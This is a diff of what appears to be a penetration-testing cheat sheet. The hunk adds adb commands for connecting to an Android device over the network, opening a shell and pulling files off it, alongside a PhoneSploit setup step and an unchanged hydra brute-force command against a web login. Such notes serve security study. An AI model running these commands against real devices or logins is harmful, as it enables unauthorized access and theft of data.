@@ -339,12 +339,21 @@ sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-fo
 <summary>ADB</summary>
   
 ```shell
+apt-get update
 sudo apt-get install adb -y
-adb devices
+adb devices -l
 
 # Connection Establish Steps
 adb connect 192.168.0.4:5555
+adb devices -l
+adb shell  
 
+# Download a File from Android using ADB tool
+adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
+adb pull sdcard/log.txt /home/mmurphy/Desktop
+  
+  
+  
 # PhoneSploit tool 
 git clone https://github.com/aerosol-can/PhoneSploit
 cd PhoneSploit
@@ -363,10 +372,6 @@ cd sdcard
 ls
 cd Download
 
-# Download a File from Android using ADB tool
-adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
-adb pull sdcard/log.txt /home/mmurphy/Desktop
-  
 #Download File using PhoneSploit
 9. Pull Folders from Phone to PC
 
